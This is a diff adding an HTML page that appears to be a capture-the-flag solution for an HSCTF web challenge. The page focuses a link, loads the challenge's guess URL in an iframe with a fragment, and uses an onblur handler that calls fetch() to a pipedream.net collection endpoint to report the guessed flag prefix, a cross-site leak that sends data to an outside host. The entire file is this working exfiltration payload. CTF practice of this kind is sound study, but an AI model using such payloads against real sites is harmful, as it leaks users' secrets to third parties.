@@ -1,0 +1,11 @@
+<html>
+<body>
+<a id="satoki" href="http://example.com" onblur="fetch('https://xxxxxxxxxxxxx.x.pipedream.net?s=flag{')">satoki</a>
+<script>
+document.getElementById("satoki").focus();
+var ifr = document.createElement("iframe");
+ifr.src = "http://web1.hsctf.com:8001/guess?guess=flag{#continue";
+document.body.appendChild(ifr);
+</script>
+</body>
+</html>
